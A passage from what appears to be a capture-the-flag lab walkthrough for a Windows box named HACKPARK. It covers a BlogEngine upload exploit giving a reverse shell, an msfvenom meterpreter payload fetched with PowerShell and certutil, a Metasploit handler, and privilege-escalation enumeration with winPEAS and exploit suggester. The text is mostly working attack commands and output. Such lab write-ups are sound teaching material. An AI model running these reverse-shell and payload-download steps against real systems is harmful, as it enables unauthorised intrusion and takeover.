</code></pre><p>Copy the exploit <code>46353.cs</code> as <code>PostView.ascx</code>, and edit <code>PostView.ascx</code> with <code>ip</code> and <code>port</code> for <code>reverse shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="using(System.Net.Sockets.TcpClient%20client%20=%20new%20System.Net.Sockets.TcpClient(%22%3Cip%3E%22,%20443))" type="button"></button></div></div><pre><code>using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("&lt;ip&gt;", 443))
</code></pre><p>Use <code>firefox</code> to view the url <code>http://&lt;ip&gt;/admin/#/content/posts</code>, open folder icon and upload the file <code>PostView.ascx</code>.</p><p>Create a <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20-cAr%20nc%20-lnvp%20443" type="button"></button></div></div><pre><code>rlwrap -cAr nc -lnvp 443
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%20443)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 443)
</code></pre><p>Use <code>firefox</code> to load the url <code>http://&lt;ip&gt;/?theme=../../App_Data/files</code> in order to spawn a <code>reverse shell</code>.</p><p>The <code>reverse shell</code> would have been spawned at <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Cip%3E%2049252%20received!%0AMicrosoft%20Windows%20[Version%206.3.9600]%0A(c)%202013%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0Ac:%5Cwindows%5Csystem32%5Cinetsrv%3E%20whoami%0Aiis%20apppool%5Cblog" type="button"></button></div></div><pre><code>Connection from &lt;ip&gt; 49252 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv&gt; whoami
iis apppool\blog
</code></pre><h2 id="task-4---windows-privilege-escalation">Task 4 - Windows Privilege Escalation</h2><h3 id="references-3">References</h3><ul><li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank">Windows Exploit Suggester</a><li><a href="https://www.exploit-db.com/exploits/45072" target="_blank">Splinterware System Scheduler PrivEsc</a><li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe" target="_blank">winPEAS</a></ul><p>Download the <code>winPEAS</code> executable using <code>wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe</code>.</p><p>Use <code>msfvenom</code> to create a <code>reverse shell</code> payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20windows/meterpreter/reverse_tcp%20-a%20x86%20--encoder%20x86/shikata_ga_nai%20LHOST=%3Cip%3E%20LPORT=4443%20-f%20exe%20-o%20revshell.exe" type="button"></button></div></div><pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=&lt;ip&gt; LPORT=4443 -f exe -o revshell.exe
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[-]%20No%20platform%20was%20selected,%20choosing%20Msf::Module::Platform::Windows%20from%20the%20payload%0AFound%201%20compatible%20encoders%0AAttempting%20to%20encode%20payload%20with%201%20iterations%20of%20x86/shikata_ga_nai%0Ax86/shikata_ga_nai%20succeeded%20with%20size%20368%20(iteration=0)%0Ax86/shikata_ga_nai%20chosen%20with%20final%20size%20368%0APayload%20size:%20368%20bytes%0AFinal%20size%20of%20exe%20file:%2073802%20bytes%0ASaved%20as:%20revshell.exe" type="button"></button></div></div><pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: revshell.exe
</code></pre><p>Create a <code>python web server</code> to download the <code>reverse shell</code> payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python%20-m%20http.server%208080" type="button"></button></div></div><pre><code>python -m http.server 8080
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Serving%20HTTP%20on%200.0.0.0%20port%208080%20(http://0.0.0.0:8080/)%20..." type="button"></button></div></div><pre><code>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</code></pre><p>From the <code>netcat</code> listener, download the payload</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="c:%5Cwindows%5Csystem32%5Cinetsrv%3E%20powershell%20-c%20%22Invoke-WebRequest%20-Uri%20'http://%3Csource-ip%3E:8080/revshell.exe'%20-OutFile%20'c:%5Cwindows%5Ctemp%5Crevshell.exe'%22%0Ac:%5Cwindows%5Csystem32%5Cinetsrv%3E%20c:%5Cwindows%5Ctemp%5Crevshell.exe%0A%0Ac:%5Cwindows%5Csystem32%5Cinetsrv%3E%20cd%20c:%5Cwindows%5Ctemp%0Ac:%5Cwindows%5Csystem32%5Cinetsrv%3E%20certutil%20-urlcache%20-split%20-f%20%22http://%3Csource-ip%3E:8080/revshell.exe%22%20revshell.exe" type="button"></button></div></div><pre><code>c:\windows\system32\inetsrv&gt; powershell -c "Invoke-WebRequest -Uri 'http://&lt;source-ip&gt;:8080/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
c:\windows\system32\inetsrv&gt; c:\windows\temp\revshell.exe

c:\windows\system32\inetsrv&gt; cd c:\windows\temp
c:\windows\system32\inetsrv&gt; certutil -urlcache -split -f "http://&lt;source-ip&gt;:8080/revshell.exe" revshell.exe
</code></pre><p>Use <code>msfconsole -q</code> to set <code>exploit/multi/handler</code> and its variables.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20%3E%20use%20exploit/multi/handler%0A[*]%20Using%20configured%20payload%20generic/shell_reverse_tcp%0Amsf5%20exploit(multi/handler)%20%3E%20set%20PAYLOAD%20windows/meterpreter/reverse_tcp%0APAYLOAD%20=%3E%20windows/meterpreter/reverse_tcp%0A%0Amsf5%20exploit(multi/handler)%20%3E%20show%20options%0A%0AModule%20options%20(exploit/multi/handler):%0A%0AName%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20---------------%20%20--------%20%20-----------%0A%0APayload%20options%20(windows/meterpreter/reverse_tcp):%0A%0AName%20%20%20%20%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20%20%20%20%20---------------%20%20--------%20%20-----------%0AEXITFUNC%20%20process%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20Exit%20technique%20(Accepted:%20'',%20seh,%20thread,%20process,%20none)%0ALHOST%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20address%20(an%20interface%20may%20be%20specified)%0ALPORT%20%20%20%20%204444%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20port%0A%0AExploit%20target:%0A%0AId%20%20Name%0A--%20%20----%0A0%20%20%20Wildcard%20Target%0A%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LHOST%20%3Csource-ip%3E%0ALHOST%20=%3E%20%3Csource-ip%3E%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LPORT%204443%0ALPORT%20=%3E%204443" type="button"></button></div></div><pre><code>msf5 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) &gt; show options

Module options (exploit/multi/handler):

Name  Current Setting  Required  Description
----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST                      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port

Exploit target:

Id  Name
--  ----
0   Wildcard Target

msf5 exploit(multi/handler) &gt; set LHOST &lt;source-ip&gt;
LHOST =&gt; &lt;source-ip&gt;
msf5 exploit(multi/handler) &gt; set LPORT 4443
LPORT =&gt; 4443
</code></pre><p>Run the exploit to gain <code>meterpreter</code> shell and get system and process information.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(multi/handler)%20%3E%20run%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Csource-ip%3E:4443%0A[*]%20Sending%20stage%20(176195%20bytes)%20to%20%3Ctarget-ip%3E%0A[*]%20Meterpreter%20session%201%20opened%20(%3Csource-ip%3E:4443%20-%3E%20%3Ctarget-ip%3E:49303)%20at%202021-04-30%2005:20:34%20+0100%0A%0Ameterpreter%20%3E%20ps%0A%0AProcess%20List%0A%0APID%20%20%20PPID%20%20Name%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Arch%20%20Session%20%20User%20%20%20%20%20%20%20%20%20%20%20%20%20%20Path%0A---%20%20%20----%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20----%20%20-------%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20----%0A0%20%20%20%20%200%20%20%20%20%20[System%20Process]%0A4%20%20%20%20%200%20%20%20%20%20System%0A348%20%20%20672%20%20%20svchost.exe%0A372%20%20%204%20%20%20%20%20smss.exe%0A476%20%20%20672%20%20%20svchost.exe%0A524%20%20%20516%20%20%20csrss.exe%0A580%20%20%20572%20%20%20csrss.exe%0A592%20%20%20516%20%20%20wininit.exe%0A616%20%20%20572%20%20%20winlogon.exe%0A648%20%20%201348%20%20w3wp.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20IIS%20APPPOOL%5CBlog%20%20C:%5CWindows%5CSystem32%5Cinetsrv%5Cw3wp.exe%0A672%20%20%20592%20%20%20services.exe%0A680%20%20%20592%20%20%20lsass.exe%0A740%20%20%20672%20%20%20svchost.exe%0A784%20%20%20672%20%20%20svchost.exe%0A860%20%20%20616%20%20%20dwm.exe%0A876%20%20%20672%20%20%20svchost.exe%0A908%20%20%20672%20%20%20svchost.exe%0A972%20%20%20672%20%20%20svchost.exe%0A1044%20%203048%20%20conhost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20IIS%20APPPOOL%5CBlog%20%20C:%5CWindows%5CSystem32%5Cconhost.exe%0A1136%20%20672%20%20%20spoolsv.exe%0A1176%20%20672%20%20%20amazon-ssm-agent.exe%0A1240%20%20672%20%20%20svchost.exe%0A1272%20%20672%20%20%20LiteAgent.exe%0A1332%20%20672%20%20%20svchost.exe%0A1348%20%20672%20%20%20svchost.exe%0A1420%20%20672%20%20%20WService.exe%0A1548%20%202404%20%20Message.exe%0A1552%20%201420%20%20WScheduler.exe%0A1652%20%20672%20%20%20Ec2Config.exe%0A1784%20%20740%20%20%20WmiPrvSE.exe%0A1988%20%203048%20%20revshell.exe%20%20%20%20%20%20%20%20%20%20x86%20%20%200%20%20%20%20%20%20%20%20IIS%20APPPOOL%5CBlog%20%20c:%5CWindows%5CTemp%5Crevshell.exe%0A2016%20%20672%20%20%20svchost.exe%0A2404%20%201752%20%20WScheduler.exe%0A2496%20%20908%20%20%20taskhostex.exe%0A2564%20%202556%20%20explorer.exe%0A2912%20%20672%20%20%20msdtc.exe%0A3020%20%202520%20%20ServerManager.exe%0A3048%20%20648%20%20%20cmd.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20IIS%20APPPOOL%5CBlog%20%20C:%5CWindows%5CSystem32%5Ccmd.exe%0A%0Ameterpreter%20%3E%20shell%0AProcess%202264%20created.%0AChannel%201%20created.%0AMicrosoft%20Windows%20[Version%206.3.9600]%0A(c)%202013%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0Ac:%5Cwindows%5Csystem32%5Cinetsrv%3Esysteminfo%0Asysteminfo%0A%0AHost%20Name:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20HACKPARK%0AOS%20Name:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Server%202012%20R2%20Standard%0AOS%20Version:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%206.3.9600%20N/A%20Build%209600%0AOS%20Manufacturer:%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Corporation%0AOS%20Configuration:%20%20%20%20%20%20%20%20%20%20Standalone%20Server%0AOS%20Build%20Type:%20%20%20%20%20%20%20%20%20%20%20%20%20Multiprocessor%20Free%0ARegistered%20Owner:%20%20%20%20%20%20%20%20%20%20Windows%20User%0ARegistered%20Organization:%0AProduct%20ID:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2000252-70000-00000-AA886%0AOriginal%20Install%20Date:%20%20%20%20%208/3/2019,%2010:43:23%20AM%0ASystem%20Boot%20Time:%20%20%20%20%20%20%20%20%20%204/30/2021,%207:48:19%20PM%0ASystem%20Manufacturer:%20%20%20%20%20%20%20Xen%0ASystem%20Model:%20%20%20%20%20%20%20%20%20%20%20%20%20%20HVM%20domU%0ASystem%20Type:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64-based%20PC%0AProcessor(s):%20%20%20%20%20%20%20%20%20%20%20%20%20%201%20Processor(s)%20Installed.%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[01]:%20Intel64%20Family%206%20Model%2063%20Stepping%202%20GenuineIntel%20~2400%20Mhz%0ABIOS%20Version:%20%20%20%20%20%20%20%20%20%20%20%20%20%20Xen%204.2.amazon,%208/24/2006%0AWindows%20Directory:%20%20%20%20%20%20%20%20%20C:%5CWindows%0ASystem%20Directory:%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5Csystem32%0ABoot%20Device:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5CDevice%5CHarddiskVolume1%0ASystem%20Locale:%20%20%20%20%20%20%20%20%20%20%20%20%20en-us;English%20(United%20States)%0AInput%20Locale:%20%20%20%20%20%20%20%20%20%20%20%20%20%20en-us;English%20(United%20States)%0ATime%20Zone:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(UTC-08:00)%20Pacific%20Time%20(US%20&amp;%20Canada)%0ATotal%20Physical%20Memory:%20%20%20%20%204,096%20MB%0AAvailable%20Physical%20Memory:%203,223%20MB%0AVirtual%20Memory:%20Max%20Size:%20%205,504%20MB%0AVirtual%20Memory:%20Available:%204,264%20MB%0AVirtual%20Memory:%20In%20Use:%20%20%20%201,240%20MB%0APage%20File%20Location(s):%20%20%20%20%20C:%5Cpagefile.sys%0ADomain:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20WORKGROUP%0ALogon%20Server:%20%20%20%20%20%20%20%20%20%20%20%20%20%20N/A%0AHotfix(s):%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%208%20Hotfix(s)%20Installed.%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[01]:%20KB2919355%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[02]:%20KB2919442%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[03]:%20KB2937220%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[04]:%20KB2938772%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[05]:%20KB2939471%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[06]:%20KB2949621%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[07]:%20KB3035131%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[08]:%20KB3060716%0ANetwork%20Card(s):%20%20%20%20%20%20%20%20%20%20%201%20NIC(s)%20Installed.%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[01]:%20AWS%20PV%20Network%20Device%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Connection%20Name:%20Ethernet%202%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20DHCP%20Enabled:%20%20%20%20Yes%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20DHCP%20Server:%20%20%20%20%2010.10.0.1%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20IP%20address(es)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[01]:%2010.10.129.246%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[02]:%20fe80::12d:9216:fea:825b%0AHyper-V%20Requirements:%20%20%20%20%20%20A%20hypervisor%20has%20been%20detected.%20Features%20required%20for%20Hyper-V%20will%20not%20be%20displayed." type="button"></button></div></div><pre><code>msf5 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on &lt;source-ip&gt;:4443
[*] Sending stage (176195 bytes) to &lt;target-ip&gt;
[*] Meterpreter session 1 opened (&lt;source-ip&gt;:4443 -&gt; &lt;target-ip&gt;:49303) at 2021-04-30 05:20:34 +0100

meterpreter &gt; ps

Process List

PID   PPID  Name                  Arch  Session  User              Path
---   ----  ----                  ----  -------  ----              ----
0     0     [System Process]
4     0     System
348   672   svchost.exe
372   4     smss.exe
476   672   svchost.exe
524   516   csrss.exe
580   572   csrss.exe
592   516   wininit.exe
616   572   winlogon.exe
648   1348  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
672   592   services.exe
680   592   lsass.exe
740   672   svchost.exe
784   672   svchost.exe
860   616   dwm.exe
876   672   svchost.exe
908   672   svchost.exe
972   672   svchost.exe
1044  3048  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
1136  672   spoolsv.exe
1176  672   amazon-ssm-agent.exe
1240  672   svchost.exe
1272  672   LiteAgent.exe
1332  672   svchost.exe
1348  672   svchost.exe
1420  672   WService.exe
1548  2404  Message.exe
1552  1420  WScheduler.exe
1652  672   Ec2Config.exe
1784  740   WmiPrvSE.exe
1988  3048  revshell.exe          x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\revshell.exe
2016  672   svchost.exe
2404  1752  WScheduler.exe
2496  908   taskhostex.exe
2564  2556  explorer.exe
2912  672   msdtc.exe
3020  2520  ServerManager.exe
3048  648   cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe

meterpreter &gt; shell
Process 2264 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv&gt;systeminfo
systeminfo

Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-70000-00000-AA886
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          4/30/2021, 7:48:19 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                        [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 3,223 MB
Virtual Memory: Max Size:  5,504 MB
Virtual Memory: Available: 4,264 MB
Virtual Memory: In Use:    1,240 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 8 Hotfix(s) Installed.
                        [01]: KB2919355
                        [02]: KB2919442
                        [03]: KB2937220
                        [04]: KB2938772
                        [05]: KB2939471
                        [06]: KB2949621
                        [07]: KB3035131
                        [08]: KB3060716
Network Card(s):           1 NIC(s) Installed.
                        [01]: AWS PV Network Device
                                Connection Name: Ethernet 2
                                DHCP Enabled:    Yes
                                DHCP Server:     10.10.0.1
                                IP address(es)
                                [01]: 10.10.129.246
                                [02]: fe80::12d:9216:fea:825b
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
</code></pre><p>Download the <code>winPEAS</code> binary from the <code>netcat</code> listener and execute it to analyse.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="c:%5Cwindows%5Csystem32%5Cinetsrv%3Ecd%20c:%5Cwindows%5Ctemp%0A%0Ac:%5CWindows%5CTemp%3Ecertutil%20-urlcache%20-split%20-f%20%22http://10.10.47.105:8080/winPEASx64.exe%22%20winPEASx64.exe%0Acertutil%20-urlcache%20-split%20-f%20%22http://10.10.47.105:8080/winPEASx64.exe%22%20winPEASx64.exe%0A****%20%20Online%20%20****%0A000000%20%20...%0A17e600%0ACertUtil:%20-URLCache%20command%20completed%20successfully.%0A%0Ac:%5CWindows%5CTemp%3EwinPEASx64.exe%0A========================================(Services%20Information)========================================%0A%0A[+]%20Interesting%20Services%20-non%20Microsoft-%0A[?]%20Check%20if%20you%20can%20overwrite%20some%20service%20binary%20or%20perform%20a%20DLL%20hijacking,%20also%20check%20for%20unquoted%20paths%20https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services%0A%0A%20%20%20%20Amazon%20EC2Launch(Amazon%20Web%20Services,%20Inc.%20-%20Amazon%20EC2Launch)[%22C:%5CProgram%20Files%5CAmazon%5CEC2Launch%5CEC2Launch.exe%22%20service]%20-%20Auto%20-%20Stopped%0A%20%20%20%20Amazon%20EC2Launch%0A%0A%20%20%20%20AmazonSSMAgent(Amazon%20SSM%20Agent)[%22C:%5CProgram%20Files%5CAmazon%5CSSM%5Camazon-ssm-agent.exe%22]%20-%20Auto%20-%20Running%0A%20%20%20%20Amazon%20SSM%20Agent%0A%0A%20%20%20%20AWSLiteAgent(Amazon%20Inc.%20-%20AWS%20Lite%20Guest%20Agent)[C:%5CProgram%20Files%5CAmazon%5CXenTools%5CLiteAgent.exe]%20-%20Auto%20-%20Running%20-%20No%20quotes%20and%20Space%20detected%0A%20%20%20%20AWS%20Lite%20Guest%20Agent%0A%0A%20%20%20%20Ec2Config(Amazon%20Web%20Services,%20Inc.%20-%20Ec2Config)[%22C:%5CProgram%20Files%5CAmazon%5CEc2ConfigService%5CEc2Config.exe%22]%20-%20Auto%20-%20Running%20-%20isDotNet%0A%20%20%20%20Ec2%20Configuration%20Service%0A%0A%20%20%20%20PsShutdownSvc(Systems%20Internals%20-%20PsShutdown)[C:%5CWindows%5CPSSDNSVC.EXE]%20-%20Manual%20-%20Stopped%0A%0A%20%20%20%20WindowsScheduler(Splinterware%20Software%20Solutions%20-%20System%20Scheduler%20Service)[C:%5CPROGRA~2%5CSYSTEM~1%5CWService.exe]%20-%20Auto%20-%20Running%0A%20%20%20%20File%20Permissions:%20Everyone%20[WriteData/CreateFiles]%0A%20%20%20%20Possible%20DLL%20Hijacking%20in%20binary%20folder:%20C:%5CProgram%20Files%20(x86)%5CSystemScheduler%20(Everyone%20[WriteData/CreateFiles])%0A%20%20%20%20System%20Scheduler%20Service%20Wrapper" type="button"></button></div></div><pre><code>c:\windows\system32\inetsrv&gt;cd c:\windows\temp

c:\Windows\Temp&gt;certutil -urlcache -split -f "http://10.10.47.105:8080/winPEASx64.exe" winPEASx64.exe
certutil -urlcache -split -f "http://10.10.47.105:8080/winPEASx64.exe" winPEASx64.exe
****  Online  ****
000000  ...
17e600
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp&gt;winPEASx64.exe
========================================(Services Information)========================================

[+] Interesting Services -non Microsoft-
[?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services

    Amazon EC2Launch(Amazon Web Services, Inc. - Amazon EC2Launch)["C:\Program Files\Amazon\EC2Launch\EC2Launch.exe" service] - Auto - Stopped
    Amazon EC2Launch

    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent

    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent

    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
    Ec2 Configuration Service

    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped

    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper
</code></pre><p>Install the prerequisites for <code>windows-exploit-suggester</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="apt%20install%20python-xlrd%20python3-xlrd" type="button"></button></div></div><pre><code>apt install python-xlrd python3-xlrd
</code></pre><p>Download the <code>windows-exploit-suggester</code> git repo using <code>git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git</code>.</p><p>Save the previously obtained output of command <code>systeminfo</code> to be analysed with <code>windows-exploit-suggester</code>.</p><p>Update the database for <code>windows-exploit-suggester</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python2%20windows-exploit-suggester.py%20--update" type="button"></button></div></div><pre><code>python2 windows-exploit-suggester.py --update
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[*]%20initiating%20winsploit%20version%203.3...%0A[+]%20writing%20to%20file%202021-04-30-mssb.xls%0A[*]%20done" type="button"></button></div></div><pre><code>[*] initiating winsploit version 3.3...
[+] writing to file 2021-04-30-mssb.xls
[*] done
</code></pre><p>Use <code>windows-exploit-suggester.py</code> script across the database to check for valid exploits.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python2%20windows-exploit-suggester.py%20--database%202021-04-30-mssb.xls%20--systeminfo%20systeminfo.txt" type="button"></button></div></div><pre><code>python2 windows-exploit-suggester.py --database 2021-04-30-mssb.xls --systeminfo systeminfo.txt
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[*]%20database%20file%20detected%20as%20xls%20or%20xlsx%20based%20on%20extension%0A[*]%20attempting%20to%20read%20from%20the%20systeminfo%20input%20file%0A[+]%20systeminfo%20input%20file%20read%20successfully%20(utf-8)%0A[*]%20querying%20database%20file%20for%20potential%20vulnerabilities%0A[*]%20comparing%20the%208%20hotfix(es)%20against%20the%20266%20potential%20bulletins(s)%20with%20a%20database%20of%20137%20known%20exploits%0A[*]%20there%20are%20now%20249%20remaining%20vulns%0A[+]%20[E]%20exploitdb%20PoC,%20[M]%20Metasploit%20module,%20[*]%20missing%20bulletin%0A[+]%20windows%20version%20identified%20as%20'Windows%202012%20R2%2064-bit'%0A[*]%0A[E]%20MS16-135:%20Security%20Update%20for%20Windows%20Kernel-Mode%20Drivers%20(3199135)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/40745/%20--%20Microsoft%20Windows%20Kernel%20-%20win32k%20Denial%20of%20Service%20(MS16-135)%0A[*]%20%20%20https://www.exploit-db.com/exploits/41015/%20--%20Microsoft%20Windows%20Kernel%20-%20'win32k.sys'%20'NtSetWindowLongPtr'%20Privilege%20Escalation%20(MS16-135)%20(2)%0A[*]%20%20%20https://github.com/tinysec/public/tree/master/CVE-2016-7255%0A[*]%0A[E]%20MS16-098:%20Security%20Update%20for%20Windows%20Kernel-Mode%20Drivers%20(3178466)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/41020/%20--%20Microsoft%20Windows%208.1%20(x64)%20-%20RGNOBJ%20Integer%20O